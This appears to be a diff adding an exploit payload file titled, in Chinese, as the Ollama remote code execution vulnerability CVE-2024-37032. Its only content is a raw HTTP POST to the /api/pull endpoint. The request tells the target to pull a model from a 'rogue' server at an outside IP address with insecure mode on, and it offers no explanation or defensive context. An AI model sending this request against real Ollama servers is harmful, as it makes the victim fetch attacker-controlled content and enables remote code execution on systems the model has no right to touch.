@@ -1,0 +1,6 @@
+# Ollama远程代码执行漏洞（CVE-2024-37032）
+POST /api/pull HTTP/1.1
+Host: www.xwd_test.com
+Content-Type: application/json
+
+{"name": "http://192.123.123.123/rogue/bi0x", "insecure": true}
